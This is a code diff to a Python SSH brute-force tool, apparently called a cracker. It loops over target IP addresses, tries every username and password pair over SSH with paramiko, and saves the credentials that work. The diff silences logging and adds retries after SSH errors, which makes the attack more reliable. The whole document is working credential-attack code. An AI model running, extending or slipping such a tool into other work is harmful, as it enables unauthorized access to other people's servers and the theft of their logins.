@@ -6,6 +6,9 @@ from time import sleep
 from os.path import exists as file_exists
 from contextlib import suppress
 from paramiko import AuthenticationException, SSHClient, AutoAddPolicy, SSHException
+from logging import CRITICAL, basicConfig
+
+basicConfig(level=CRITICAL)
 
 
 class Counter:
@@ -165,8 +168,7 @@ class Cracker:
         def run(self):
             with suppress(StopIteration, RuntimeError):
                 while self.root.isRunning():
-                    with suppress(Exception):
-                        self.crack(next(self.root.sync_ips_iter))
+                    self.crack(next(self.root.sync_ips_iter))
                 return
 
         def crack(self, target, port=22):
@@ -174,25 +176,32 @@ class Cracker:
             
             for username in self.root.userlist:
                 for password in self.root.passlist:
-                    with suppress(Exception):
+                    ties = 5
+                    while ties:
                         try:
-
                             sshClient = SSHClient()
                             sshClient.set_missing_host_key_policy(AutoAddPolicy()) 
                             sshClient.load_system_host_keys()
                             sshClient.connect(target, port, username, password, timeout=1)
                             self.root.save(target, port, username, password)
+                            ties = 0
 
                         except TimeoutError:
                             Logger.fail("[%s] Timeout !" % target)
+                            ties = 0
                         except AuthenticationException:
                             Logger.fail("[%s] Invalid user or password %s:%s" % (target, username, password))
+                            ties = 0
                         except SSHException:
                             Logger.warning("[%s] an SSHException recived !" % target)
+                            ties -= 1
                         except EOFError:
                             Logger.warning("[%s] an EOFError recived !" % target)
+                            ties -= 1
                         except Exception as e:
                             Logger.warning("Unknown error recived ", e)
+                            ties -= 1
+                            
                         
             self.root.tried += 1
 
